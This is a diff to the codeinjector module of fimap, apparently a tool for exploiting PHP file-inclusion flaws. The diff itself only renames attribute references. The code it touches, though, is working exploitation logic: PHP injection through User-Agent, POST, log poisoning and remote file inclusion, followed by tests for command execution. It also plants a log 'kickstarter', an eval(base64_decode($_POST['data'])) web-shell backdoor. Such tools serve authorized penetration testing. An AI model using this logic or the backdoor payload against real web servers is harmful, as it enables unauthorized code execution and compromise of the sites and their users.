@@ -46,10 +46,10 @@ class codeinjector(baseClass):
         self.report = report
 
     def testExecutionMethods(self):
-        info_payload = self.globSet.settings["php_info"][0]
-        info_pattern = self.globSet.settings["php_info"][1]
+        info_payload = self.settings["php_info"][0]
+        info_pattern = self.settings["php_info"][1]
         
-        #for k,v in self.globSet.settings["php_exec"]
+        #for k,v in self.settings["php_exec"]
 
     def start(self):
         domain = self.chooseDomains()
@@ -76,23 +76,23 @@ class codeinjector(baseClass):
         code = None
 
         if (mode.find("A") != -1 and mode.find("x") != -1):
-            self._log("Testing php-code injection thru User-Agent...", self.globSet.LOG_INFO)
+            self._log("Testing php-code injection thru User-Agent...", self.LOG_INFO)
 
         elif (mode.find("P") != -1 and mode.find("x") != -1):
-            self._log("Testing php-code injection thru POST...", self.globSet.LOG_INFO)
+            self._log("Testing php-code injection thru POST...", self.LOG_INFO)
 
         elif (mode.find("L") != -1):
             if (mode.find("H") != -1):
-                self._log("Testing php-code injection thru Logfile HTTP-UA-Injection...", self.globSet.LOG_INFO)
+                self._log("Testing php-code injection thru Logfile HTTP-UA-Injection...", self.LOG_INFO)
             elif (mode.find("F") != -1):
-                self._log("Testing php-code injection thru Logfile FTP-Username-Injection...", self.globSet.LOG_INFO)
+                self._log("Testing php-code injection thru Logfile FTP-Username-Injection...", self.LOG_INFO)
 
         elif (mode.find("R") != -1):
             if settings["dynamic_rfi"]["mode"] == "ftp":
-                self._log("Testing code thru FTP->RFI...", self.globSet.LOG_INFO)
+                self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
                 url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
             elif settings["dynamic_rfi"]["mode"] == "local":
-                self._log("Testing code thru LocalHTTP->RFI...", self.globSet.LOG_INFO)
+                self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                 url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
             else:
                 print "fimap is currently not configured to exploit RFI vulnerabilitys."
@@ -100,19 +100,19 @@ class codeinjector(baseClass):
 
         code = self.__doHaxRequest(url, mode, settings["php_info"][0], suffix)
         if code == None:
-            self._log("php-code testing failed! code=None", self.globSet.LOG_ERROR)
+            self._log("php-code testing failed! code=None", self.LOG_ERROR)
             sys.exit(1)
 
 
         if (code.find(settings["php_info"][1]) != -1):
-            self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
+            self._log("PHP Injection works! Testing if execution works...", self.LOG_ALWAYS)
             php_inject_works = True
             for item in settings["php_exec"]:
                 name, payload = item
-                self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
+                self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
                 testload = payload.replace("__PAYLOAD__", base64.b64encode(settings["shell_test"][0]))
                 if (mode.find("A") != -1):
-                    self.globSet.setUserAgent(testload)
+                    self.setUserAgent(testload)
                     code = self.doGetRequest(url)
                 elif (mode.find("P") != -1):
                     code = self.doPostRequest(url, testload)
@@ -124,7 +124,7 @@ class codeinjector(baseClass):
                 if code != None and code.find(settings["shell_test"][1]) != -1:
                     sys_inject_works = True
                     working_shell = item
-                    self._log("Execution thru '%s' works!"%(name), self.globSet.LOG_INFO)
+                    self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                     break
 
             attack = None
@@ -194,7 +194,7 @@ class codeinjector(baseClass):
 
         userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd)
         if (m.find("A") != -1):
-            self.globSet.setUserAgent(userload)
+            self.setUserAgent(userload)
             code = self.doGetRequest(url)
         elif (m.find("P") != -1):
             code = self.doPostRequest(url, userload)
@@ -202,30 +202,30 @@ class codeinjector(baseClass):
             code = self.executeRFI(url, appendix, userload)
         elif (m.find("L") != -1):
             if (not self.isLogKickstarterPresent):
-                self._log("Testing if log kickstarter is present...", self.globSet.LOG_INFO)
+                self._log("Testing if log kickstarter is present...", self.LOG_INFO)
                 testcode = self.getPHPQuiz()
                 code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
                 if (code.find(testcode[1]) == -1):
-                    self._log("Kickstarter is not present. Injecting kickstarter...", self.globSet.LOG_INFO)
+                    self._log("Kickstarter is not present. Injecting kickstarter...", self.LOG_INFO)
                     kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
-                    ua = self.globSet.getUserAgent()
-                    self.globSet.setUserAgent(kickstarter)
+                    ua = self.getUserAgent()
+                    self.setUserAgent(kickstarter)
                     tmpurl = url[:url.find("?")]
                     self.doGetRequest(tmpurl)
-                    self.globSet.setUserAgent(ua)
+                    self.setUserAgent(ua)
                     
-                    self._log("Testing once again if kickstarter is present...", self.globSet.LOG_INFO)
+                    self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                     testcode = self.getPHPQuiz()
                     code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
 
                     if (code.find(testcode[1]) == -1):
-                        self._log("Failed to inject kickstarter!", self.globSet.LOG_ERROR)
+                        self._log("Failed to inject kickstarter!", self.LOG_ERROR)
                         sys.exit(1)
                     else:
-                        self._log("Kickstarter successfully injected!", self.globSet.LOG_INFO)
+                        self._log("Kickstarter successfully injected!", self.LOG_INFO)
                         self.isLogKickstarterPresent = True
                 else:
-                    self._log("Kickstarter found!", self.globSet.LOG_INFO)
+                    self._log("Kickstarter found!", self.LOG_INFO)
                     self.isLogKickstarterPresent = True
 
             if (self.isLogKickstarterPresent):
